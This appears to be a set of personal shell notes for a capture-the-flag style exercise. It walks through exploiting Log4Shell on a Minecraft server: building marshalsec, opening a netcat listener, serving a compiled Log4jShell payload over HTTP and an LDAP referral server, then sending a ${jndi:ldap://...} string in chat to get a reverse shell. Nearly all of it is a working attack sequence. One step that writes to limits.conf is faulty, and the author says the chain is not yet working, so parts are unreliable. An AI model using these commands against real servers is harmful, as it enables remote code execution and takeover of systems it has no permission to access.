#The simplest way to solve this is by crafting a bit of malicious code 
#to give yourself a reverse shell so you can view the contents of the file with the flag what file?
#@This can be done by setting up a netcat listener, a web server to serve the code and the exploit via a weaponized ldap server.
#I personally used a Kali vm to host these servers and serve the malicious code.

#Follow the instructions here https://github.com/Justin-Garey/Minecraft-Log4j-Exploit?tab=readme-ov-file to compile the exploit.

#download the jdk file you need into folder you will run the poc from, jdk-8u181-linux-x64.tar.gz and extract it
sudo tar -zxvf jdk-8u181-linux-x64.tar.gz -C /usr/lib/jvm

#Set it as an option in java and javac
sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_181/bin/java 1
sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_181/bin/javac 1


#set the java version to 8u181
sudo update-alternatives --config java
sudo update-alternatives --config javac

#install marshalsec and maven
git clone https://github.com/mbechler/marshalsec.git
sudo apt update
sudo apt install maven
cd marshalsec
ulimit -n 4096
#Increase System-Wide Limits: by editing /etc/security/limits.conf file, ensure your VM has 4096mb of memory allocted
sudo echo "* soft nofile 4096" > /etc/security/limits.conf 
sudo echo "* hard nofile 4096" > /etc/security/limits.conf 
mvn clean package -DskipTests #start maven

sudo nc -lvnp 9001 #open netcat listener

javac Log4jShell.java #Update Log4jShell.java with your nc listener IP and port, compile the exploit 

sudo python3 -m http.server 8888 #open this where Log4jShell.class is stored

#start the ldap listener
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jShell"

#would prefer compiling the exploit, starting web server and the referrer is all done via python_poc.py 
#still trying to get this to work
#pip install -r requirements.txt
#python3 python_poc.py --userip localhost --webport 8888 --lport 9001
#If python works the command to use would be ${jndi:ldap://192.168.1.26:1389/a}

#Send this command in the chat in the minecraft server
${jndi:ldap://192.168.1.26:1389/#Log4jShell}
#this will connect to the ldap server and return the payload "Log4jShell.class" from the directory the web server is running in
#if the payload is correct it will connect to your nc listener and give you a shell

#Im seeing the connection to the ldap server, but its not forwarding to the web server to pull the file